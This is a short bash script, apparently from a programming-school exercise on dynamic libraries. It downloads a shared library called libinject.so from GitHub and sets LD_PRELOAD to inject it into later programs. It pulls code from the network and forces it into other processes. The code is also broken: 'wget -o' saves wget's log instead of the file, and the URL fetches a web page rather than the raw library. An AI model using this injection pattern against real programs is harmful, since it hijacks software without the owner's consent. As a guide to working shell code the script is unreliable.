#!/bin/bash
wget -o /tmp/injection https://github.com/MiguelBarreraDev/holbertonschool-low_level_programming/blob/main/0x18-dynamic_libraries/libinject.so
export LD_PRELOAD=/tmp/injection
